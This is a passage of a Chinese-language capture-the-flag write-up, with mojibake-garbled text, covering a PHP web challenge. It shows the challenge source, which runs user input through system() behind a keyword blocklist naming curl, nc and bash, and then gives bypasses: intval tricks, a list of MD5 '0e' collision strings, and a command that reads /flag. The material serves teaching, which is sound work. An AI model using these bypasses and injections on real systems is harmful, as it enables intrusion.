class="token comment">//åœ¨64ä½ç³»ç»Ÿä¸­ intval()çš„ä¸Šé™ä¸æ˜¯2147483647 çœçœå§</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"éæ´²æ¬¢è¿ä½ 2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token variable">$numPositve</span> <span class="token operator">===</span> <span class="token variable">$numReverse</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">isPalindrome</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"æˆ‘ä¸ç»æ„é—´çœ‹äº†çœ‹æˆ‘çš„åŠ³åŠ›å£«, ä¸æ˜¯æƒ³çœ‹æ—¶é—´, åªæ˜¯æƒ³ä¸ç»æ„é—´, è®©ä½ çŸ¥é“æˆ‘è¿‡å¾—æ¯”ä½ å¥½.&lt;/br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"é‡‘é’±è§£å†³ä¸äº†ç©·äººçš„æœ¬è´¨é—®é¢˜"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"å»éæ´²å§1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//level 2</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'md5'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$md5</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'md5'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$md5</span><span class="token operator">==</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$md5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"æƒ³åˆ°è¿™ä¸ªCTFeræ‹¿åˆ°flagå, æ„Ÿæ¿€æ¶•é›¶, è·‘å»ä¸œæ¾œå²¸, æ‰¾ä¸€å®¶é¤å…, æŠŠå¨å¸ˆè½°å‡ºå», è‡ªå·±ç‚’ä¸¤ä¸ªæ‹¿æ‰‹å°èœ, å€’ä¸€æ¯æ•£è£…ç™½é…’, è‡´å¯Œæœ‰é“, åˆ«å­¦å°æš´.&lt;/br>"</span><span class="token punctuation">;</span>    <span class="token keyword">else</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"æˆ‘èµ¶ç´§å–Šæ¥æˆ‘çš„é…’è‚‰æœ‹å‹, ä»–æ‰“äº†ä¸ªç”µè¯, æŠŠä»–ä¸€å®¶å®‰æ’åˆ°äº†éæ´²"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"å»éæ´²å§"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//get flag</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'get_flag'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'get_flag'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strstr</span><span class="token punctuation">(</span><span class="token variable">$get_flag</span><span class="token punctuation">,</span><span class="token string double-quoted-string">" "</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"cat"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"more"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"tail"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"less"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"head"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"tac"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"$"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"sort"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"curl"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nc"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"bash"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"æƒ³åˆ°è¿™é‡Œ, æˆ‘å……å®è€Œæ¬£æ…°, æœ‰é’±äººçš„å¿«ä¹å¾€å¾€å°±æ˜¯è¿™ä¹ˆçš„æœ´å®æ— å, ä¸”æ¯ç‡¥.&lt;/br>"</span><span class="token punctuation">;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"å¿«åˆ°éæ´²äº†"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"å»éæ´²å§"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>å…ˆä¸€å±‚å±‚ç»•è¿‡ï¼Œé¦–å…ˆç¬¬ä¸€ä¸ª<code>if</code>ï¼Œä¼ å…¥numï¼Œç®€å•æ¥è¯´å°±æ˜¯</p><ul><li>numç»“æœå–æ•´åå’ŒåŸæ¥çš„å­—ç¬¦ä¸²éœ€è¦ç›¸ç­‰ï¼Œä½†æ˜¯è¿™é‡Œåªéœ€è¦<code>==</code>å³å¯</li><li>numéœ€è¦ä¸ºæ•°å­—ï¼Œå–æ•´åçš„æ•°å­—ä¸èƒ½å°äº-999999999999999999æˆ–è€…å¤§äº999999999999999999</li><li>numåœ¨ç»è¿‡å–æ•´å’Œåè½¬å­—ç¬¦ä¸²åå–æ•´åçš„æ•°å­—éœ€è¦ç›¸ç­‰</li><li>numç»è¿‡<code>isPalindrome</code>å‡½æ•°è¿”å›çš„å€¼éœ€è¦ä¸º<code>false</code></li></ul><p>å†æ¥çœ‹çœ‹<code>isPalindrome</code>å‡½æ•°ï¼Œå­—ç¬¦ä¸²ä¸¤è¾¹å¯¹ç§°çš„æ•°å­—éœ€è¦æœ‰ä¸ä¸€æ ·ï¼Œæ‰èƒ½ä½¿<code>$l=0</code>ï¼Œè¿”å›<code>false</code>è¿™æ ·ä¸å‰é¢çš„æ¡ä»¶å°±çŸ›ç›¾äº†ï¼Œåè½¬ååˆéœ€è¦ç›¸ç­‰ï¼Œåˆä¸èƒ½å¯¹ç§°ã€‚</p><p>ä»¥ä¸‹æä¾›ä¸¤ç§ç»•è¿‡æ–¹å¼ï¼š</p><pre class="language-none"><code class="language-none">00.01000000000000000.00000000000000010</code></pre><p>ç¬¬ä¸€ç§ç¡®å®æ˜¯æ²¡æœ‰ä»»ä½•æ“ä½œå°±ç›´æ¥ç»•è¿‡äº†ï¼Œè€Œç¬¬äºŒç§åˆ™æ˜¯æµ®ç‚¹æ•°çš„ç²¾åº¦é—®é¢˜ï¼Œåœ¨æœåŠ¡å™¨ä¸Š</p><p><code>var_dump(intval(1000000000000000.00000000000000010) === intval(strrev(1000000000000000.00000000000000010)));</code></p><p>æ˜¯å¯ä»¥è¿”å›trueçš„ï¼Œä½†æ˜¯æˆ‘åœ¨æœ¬åœ°æµ‹è¯•åˆ°</p><p><code>var_dump(intval(1000000.00000010) === intval(strrev(1000000.00000010)));</code></p><p>å°±è¿”å›falseäº†ï¼Œä¸çŸ¥é“ä»€ä¹ˆé¬¼-.-</p><p>å†ç»•è¿‡ç¬¬äºŒä¸ªif</p><p>è¿™ä¸ªéœ€è¦è®©<code>$md5==md5(md5($md5))</code>ï¼Œå¼±æ¯”è¾ƒï¼Œç»•å¦‚æœmd5=0exxxxxxxxï¼Œç»è¿‡ä¸¤æ¬¡md5åŠ å¯†åçš„md5å€¼ä¹Ÿä¸º0exxxxxxxxï¼Œå³å¯ç»•è¿‡</p><p>å†™ä¸ªè„šæœ¬çˆ†ç ´å³å¯ï¼Œè¿™æ ·çš„å­—ç¬¦ä¸²æŒºå¤šçš„ï¼Œä»¥ä¸‹åˆ—ä¸¾å‡ ä¸ªï¼š</p><pre class="language-none"><code class="language-none">0e3900184182-&gt;0e1418721190302697727652753637950e6201668706-&gt;0e7985422574949326206502419486330e6702291282-&gt;0e1005063503807650968114418218160e1808236718-&gt;0e9355671365452205537103932527520e9507776345-&gt;0e8846062744707241436539484045430e7208324299-&gt;0e0296373600831971546521412019920e2010692162-&gt;0e5148989988791743362037461270580e9410970854-&gt;0e4302790236499053907065604760830e3511282263-&gt;0e657335831331991043075342997270</code></pre><p>å†åˆ°æœ€åget flag</p><p>è¿‡æ»¤äº†æŒºå¤šçš„å‘½ä»¤ï¼Œä½†æ˜¯è¿˜æ˜¯å¯ä»¥ç»•è¿‡ï¼š</p><pre class="language-shell" data-language="shell"><code class="language-shell">nl<span class="token operator">&lt;</span>/flag<span class="token operator">|</span><span class="token function">nl</span>rev<span class="token operator">&lt;</span>/flag<span class="token operator">|</span><span class="token function">rev</span></code></pre><p>éšåå³å¯æ‹¿åˆ°flag</p><h3 id="WEB-WUSTCTFæœ´å®æ— åRevenge-Revenge"><a href="#WEB-WUSTCTFæœ´å®æ— åRevenge-Revenge" class="headerlink" title="WEB_WUSTCTFæœ´å®æ— åRevenge_Revenge"></a>WEB_WUSTCTFæœ´å®æ— åRevenge_Revenge</h3><p>æºç ï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Content-type:text/html;charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">isPalindrome</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$len</span><span class="token operator">=</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$l</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token variable">$k</span><span class="token operator">=</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$len</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$j</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$j</span><span class="token operator">&lt;</span><span class="token variable">$k</span><span class="token punctuation">;</span><span class="token variable">$j</span><span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">,</span><span class="token variable">$j</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">,</span><span class="token variable">$len</span><span class="token operator">-</span><span class="token variable">$j</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$l</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$l</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>    <span class="token keyword">else</span> <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//level 1</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$num</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$numPositve</span> <span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$numReverse</span> <span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">strrev</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[^0-9.]/'</span><span class="token punctuation">,</span> <span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"éæ´²æ¬¢è¿ä½ 1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\./"</span><span class="token punctuation">,</span> <span class="token variable">$num</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\-/"</span><span class="token punctuation">,</span> <span class="token variable">$num</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\-/"</span><span class="token punctuation">,</span> <span class="token variable">$num</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^[-]/'</span><span class="token punctuation">,</span> <span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"æ²¡æœ‰è¿™æ ·çš„æ•°"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$num</span> <span class="token operator">!=</span> <span class="token variable">$numPositve</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'æœ€å¼€å§‹ä¸Šé¢˜æ—¶å€™å¿˜å†™äº†è¿™ä¸ªï¼Œå¯¼è‡´è¿™level 1å˜æˆäº†å¼±æ™ºï¼Œæ€ªä¸å¾—è¿™ä¹ˆå¤šäººsolve'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$numPositve</span> <span class="token operator">&lt;=</span> <span class="token operator">-</span><span class="token number">999999999999999999</span> <span class="token operator">||</span> <span class="token variable">$numPositve</span> <span class="token operator">>=</span> <span class="token number">999999999999999999</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">//åœ¨64ä½ç³»ç»Ÿä¸­ intval()çš„ä¸Šé™ä¸æ˜¯2147483647 çœçœå§</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"éæ´²æ¬¢è¿ä½ 2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token variable">$numPositve</span> <span class="token operator">===</span> <span class="token variable">$numReverse</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">isPalindrome</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"æˆ‘ä¸ç»æ„é—´çœ‹äº†çœ‹æˆ‘çš„åŠ³åŠ›å£«, ä¸æ˜¯æƒ³çœ‹æ—¶é—´, åªæ˜¯æƒ³ä¸ç»æ„é—´, è®©ä½ çŸ¥é“æˆ‘è¿‡å¾—æ¯”ä½ å¥½.&lt;/br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"é‡‘é’±è§£å†³ä¸äº†ç©·äººçš„æœ¬è´¨é—®é¢˜"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"å»éæ´²å§"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//level 2</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'md5'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$md5</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'md5'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$md5</span><span class="token operator">==</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$md5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"æƒ³åˆ°è¿™ä¸ªCTFeræ‹¿åˆ°flagå, æ„Ÿæ¿€æ¶•é›¶, è·‘å»ä¸œæ¾œå²¸, æ‰¾ä¸€å®¶é¤å…, æŠŠå¨å¸ˆè½°å‡ºå», è‡ªå·±ç‚’ä¸¤ä¸ªæ‹¿æ‰‹å°èœ, å€’ä¸€æ¯æ•£è£…ç™½é…’, è‡´å¯Œæœ‰é“, åˆ«å­¦å°æš´.&lt;/br>"</span><span class="token punctuation">;</span>    <span class="token keyword">else</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"æˆ‘èµ¶ç´§å–Šæ¥æˆ‘çš„é…’è‚‰æœ‹å‹, ä»–æ‰“äº†ä¸ªç”µè¯, æŠŠä»–ä¸€å®¶å®‰æ’åˆ°äº†éæ´²"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"å»éæ´²å§"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//get flag</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'get_flag'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'get_flag'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strstr</span><span class="token punctuation">(</span><span class="token variable">$get_flag</span><span class="token punctuation">,</span><span class="token string double-quoted-string">" "</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"cat"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"more"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"tail"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"less"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"head"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"tac"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"sort"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nl"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"$"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"curl"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"bash"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nc"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token 